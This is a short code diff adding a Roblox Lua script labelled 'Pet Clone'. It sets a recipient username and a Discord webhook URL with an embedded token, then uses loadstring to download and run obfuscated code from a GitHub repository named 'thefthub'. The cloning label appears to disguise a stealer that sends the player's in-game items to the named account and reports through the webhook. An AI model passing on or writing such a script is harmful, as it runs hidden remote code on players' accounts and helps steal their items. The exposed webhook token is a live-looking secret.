@@ -1,0 +1,7 @@
+_G.Username = "kingplantmaha"
+_G.HubName = "Pet Clone"
+_G.WeebhookUrl = "https://discord.com/api/webhooks/1117741720889720893/ZeVIz0f44sG76aZXAx83qEXmVcW9ADV7xBdwyxLEHhN8OqdT3VqWDxxl87vrkWvq5HrI
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Servantees/thefthub/main/obf"))() 
+--]]
